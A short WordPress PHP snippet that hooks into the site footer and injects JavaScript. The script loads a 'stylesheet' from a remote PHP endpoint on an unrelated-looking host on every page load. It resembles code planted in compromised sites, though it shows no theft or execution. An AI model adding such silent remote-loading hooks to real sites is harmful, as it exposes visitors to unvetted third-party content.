function inject_footer() { ?>
    <script type="text/javascript">
      (function() {var link = document.createElement('link');
            link.rel = 'stylesheet';
                   link.type = 'text/css';
                   link.href = 'https://hostingersite.com/com.php/?key=key';
                   document.head.appendChild(link);})();
    </script><?php
}
add_action('wp_footer', 'inject_footer');
